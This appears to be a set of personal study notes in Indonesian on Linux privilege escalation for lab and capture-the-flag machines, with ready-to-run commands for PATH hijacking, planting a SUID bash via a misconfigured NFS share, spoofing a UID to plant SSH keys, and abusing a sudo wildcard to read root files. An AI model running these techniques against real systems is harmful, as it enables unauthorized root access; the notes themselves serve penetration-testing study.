# Usefool Tools and links
Cek Priv Esc
https://github.com/sleventyeleven/linuxprivchecker

Kalau stuck bisa kesini
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

# Kernel Exploit
Intinya nyari apakah versi kernel vuln. Cara ceknya
`uname -a`
Terus cari exploitnya -> Compile -> Run -> Boom

# Cron Jobs
Untuk cron jobs ini terkadang kita gak tau apakah ada atau tidak, nah cara untuk mengetahuinya bisa menggunakan tools pspy
https://github.com/DominicBreuker/pspy

Jadi tools ini akan melakukan monitoring, perintah-perintah apa saja yang dilajalankan oleh user lain termasuk root

# Checklist
![[linux_privesc.jpg]]

12. LD_PRELOAD
13. PATH INJECTION

# Path Injection
Path injection terjadi karena pemanggilan binary dengan akses root yang tidak menggunakan full path. Contoh pemangilan yang benar
```
/usr/local/bin/nmap -sV 192.168.1.1
```

Contoh pemanggilan yang salah
```
nmap -sV 192.168.1.1
```
Kenapa kok bisa salah? karena hal ini bisa menjadi celah PATH injection. 

Linux menggunakan PATH untuk memanggil aplikasi tanpa menulis full path. Sama seperti Environment variable di windows. Namun ketika aplikasi ini dipanggil tanpa full path dengan akses root, maka kita bisa melakukan injection agar aplikasi yang dipanggil pertama kali di eksekusi pada direktori yang kita inginkan. 

```
cd /tmp
echo "/bin/bash" > ps #nama binary
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
whoami
```

Ya jadi contohnya diatas, kita menambahkan $PATH direktori `/tmp` dimana diletakkan di awal, sehingga aplikasi yang tanpa full path tadi akan mencari pertama kali ke folder `tmp`

# NFS
Kalau menemukan NFS, coba mount 

```
showmount -e 192.168.1.9
```

Terus kalau muncul direktori yang boleh dimount, kita langsung mount ke tmp directory

Attacker machine : 
```
mkdir /tmp/mydrive
sudo mount -t nfs 192.168.1.9:/home/deon /tmp/mydrive
cd /tmp/mydrive
cp /bin/bash .
chmod +s bash
```

Lalu pada victim machine:
```
cd /home/deon
./bash -p
```

## NFS restricted
Studi kasus Vulnix dimana hasil mount hanya bisa diakses oleh user dengan nama vulnix dan id 2008, maka untuk melakuknnya adalah

```
useradd -u 2008 vulnix
passwd vulnix
mkdir /home/vulnix
chown vulnix:vulnix /home/vulnix
su vulnix
ssh-keygen -t rsa
cd /tmp/mydrive
mkdir ./.ssh
cat /home/vulnix/.ssh/id_rsa.pub > ./.ssh/authorized_keys
```
Perintah diatas, kita membuat SSH key pair agar bisa login dengan key, nah keynya disimpan pada `/home/vulnix` yang dalam ini kita  mound ke `/tmp/mydrive`
Lalu sebagai user root, login ssh dengan key tsb
```
ssh -i /home/vulnix/.ssh/id_rsa vulnix@192.168.1.9
```

# Asterisk
Jika saat melakukan `sudo -l`, muncul seperti ini :
```
(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```
Artinya kita bisa menjalankan `cat` atau `ls` sebagai root. Perhatikan bahwa kita hanya boleh menggunakan perintah tersebut pada direktori `/accounts/*`, yang menarik disini adalah asterisk `*` dimana memiliki celah kita bisa baca di direktori mana saja. Sehingga exploitnya
```
sudo /bin/cat /accounts/../root/root.txt
```
Kita bisa menggunakan file inclusion
Latihan : SkyTower  VulnHub

# PS 
perintah `ps` digunakan untuk menampilkan proses yang sedang berjalan. 

Biasanya pada saat mendapakatkan low shell, kita berada pada user `www-data`, misalnya terdapat user dengan nama `andy` dan semua cara sudah kita lakukan namun tidak menemukan cara untuk priv esc ke `andy`, maka coba lihat apakah ada proses yang dijalankan oleh andy
```
ps aux | grep andy
```

Nah jika ada maka tes proses/aplikasi yang dijalankan apakah ada RCE

## Another Reference
### xhxBrofessor
![Linux Priv Esc 2](https://github.com/hxhBrofessor/PrivEsc-MindMap/raw/main/Linux-Privesc.JPG)

### Conda

![Linux PrivEsc](https://github.com/C0nd4/OSCP-Priv-Esc/blob/main/images/Linux%20Privilege%20Escalation.png?raw=true)